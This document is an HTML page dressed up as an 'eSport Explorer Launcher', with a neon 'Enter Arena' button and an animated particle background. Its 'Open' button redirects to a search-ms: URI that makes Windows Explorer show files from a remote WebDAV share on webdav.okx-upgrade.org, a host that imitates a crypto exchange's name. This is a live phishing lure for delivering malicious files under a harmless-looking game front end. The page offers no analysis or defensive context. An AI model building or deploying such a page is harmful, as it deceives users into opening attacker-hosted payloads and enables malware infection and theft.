<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eSport Explorer Launcher</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #0a0a23 0%, #1c2526 100%);
            overflow: hidden;
            font-family: 'Orbitron', sans-serif;
        }

        /* Enter button styling */
        .enter-button {
            padding: 25px 50px;
            font-size: 28px;
            color: #00ffff;
            background: transparent;
            border: 3px solid #00ffff;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 3px;
            position: relative;
            overflow: hidden;
            z-index: 10;
        }

        .enter-button:hover {
            background: #00ffff;
            color: #0a0a23;
            box-shadow: 0 0 25px #00ffff;
            transform: scale(1.05);
        }

        /* Neon glow effect */
        .enter-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                90deg,
                transparent,
                rgba(0, 255, 255, 0.4),
                transparent
            );
            transition: 0.5s;
        }

        .enter-button:hover::before {
            left: 100%;
        }

        /* Please wait overlay */
        .wait-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            justify-content: center;
            align-items: center;
            z-index: 100;
            flex-direction: column;
            color: #00ffff;
            font-size: 36px;
            text-transform: uppercase;
            letter-spacing: 4px;
        }

        .wait-overlay.active {
            display: flex;
        }

        .open-button {
            margin-top: 20px;
            padding: 15px 30px;
            font-size: 20px;
            color: #00ffff;
            background: transparent;
            border: 2px solid #00ffff;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .open-button:hover {
            background: #00ffff;
            color: #0a0a23;
            box-shadow: 0 0 15px #00ffff;
        }

        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid #00ffff;
            border-top: 5px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-top: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* eSport background canvas */
        #background {
            position: absolute;
            width: 100%;
            height: 100%;
            z-index: -1;
        }

        /* Arena-like overlay */
        .arena-overlay {
            position: absolute;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: radial-gradient(circle, rgba(0, 255, 255, 0.1) 0%, transparent 70%);
            animation: pulse 5s infinite ease-in-out;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 0.6; }
        }

        /* HUD-like elements */
        .hud-elements {
            position: absolute;
            width: 100%;
            height: 100%;
            z-index: -1;
            pointer-events: none;
        }

        .hud-elements::before, .hud-elements::after {
            content: '';
            position: absolute;
            border: 2px solid rgba(0, 255, 255, 0.2);
            animation: flicker 2s infinite;
        }

        .hud-elements::before {
            top: 20px;
            left: 20px;
            right: 20px;
            height: 50px;
            border-bottom: none;
        }

        .hud-elements::after {
            bottom: 20px;
            left: 20px;
            right: 20px;
            height: 50px;
            border-top: none;
        }

        @keyframes flicker {
            0%, 100% { opacity: 0.2; }
            50% { opacity: 0.4; }
        }

        /* Responsive design */
        @media (max-width: 768px) {
            .enter-button {
                padding: 20px 40px;
                font-size: 20px;
            }
            .wait-overlay {
                font-size: 24px;
            }
            .open-button {
                padding: 10px 20px;
                font-size: 16px;
            }
            .loader {
                width: 40px;
                height: 40px;
            }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
</head>
<body>
    <canvas id="background"></canvas>
    <div class="arena-overlay"></div>
    <div class="hud-elements"></div>
    <button class="enter-button" onclick="showWaitOverlay()">Enter Arena</button>
    <div class="wait-overlay" id="waitOverlay">
        <div>Accessing Arena</div>
        <div class="loader"></div>
        <button class="open-button" onclick="openExplorer()">Open</button>
    </div>

    <script>
        function showWaitOverlay() {
            document.getElementById('waitOverlay').classList.add('active');
        }

        function openExplorer() {
            // Attempt to open URI
            window.location.href = 'search-ms:query=love&crumb=location:\\\\webdav.okx-upgrade.org@SSL\\DavWWWRoot&displayname=Search';
            // Note: If user cancels, browser will stay on page, keeping overlay active
        }

        // eSport background animation
        const canvas = document.getElementById('background');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const particlesArray = [];
        const numberOfParticles = 200;

        class Particle {
            constructor() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.size = Math.random() * 5 + 1;
                this.speedX = Math.random() * 1 - 0.5; // Faster for arena feel
                this.speedY = Math.random() * 1 - 0.5;
                this.color = `hsl(${Math.random() * 60 + 180}, 100%, ${Math.random() * 20 + 40}%)`;
                this.type = Math.random() < 0.3 ? 'square' : 'circle'; // Mix shapes
            }

            update() {
                this.x += this.speedX;
                this.y += this.speedY;

                if (this.size > 0.2) this.size -= 0.03;

                if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
                if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
            }

            draw() {
                ctx.fillStyle = this.color;
                ctx.beginPath();
                if (this.type === 'square') {
                    ctx.rect(this.x - this.size / 2, this.y - this.size / 2, this.size, this.size);
                } else {
                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                }
                ctx.fill();
            }
        }

        function init() {
            for (let i = 0; i < numberOfParticles; i++) {
                particlesArray.push(new Particle());
            }
        }

        function animate() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; // Slight trail effect
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            for (let i = 0; i < particlesArray.length; i++) {
                particlesArray[i].update();
                particlesArray[i].draw();

                if (particlesArray[i].size <= 0.2) {
                    particlesArray.splice(i, 1);
                    i--;
                    particlesArray.push(new Particle());
                }
            }
            requestAnimationFrame(animate);
        }

        init();
        animate();

        // Handle window resize
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
    </script>
</body>
</html>
